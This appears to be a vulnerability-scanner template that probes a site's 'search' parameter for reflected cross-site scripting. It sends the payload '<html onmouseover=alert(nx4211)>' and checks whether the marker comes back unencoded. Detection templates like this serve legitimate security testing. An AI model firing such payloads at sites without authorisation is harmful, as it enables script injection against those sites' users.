id: xss4-212
name: 'Raw XSS4 #11 in search'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in search'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      search:
        - '<html onmouseover=alert(nx4211)>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx4211'
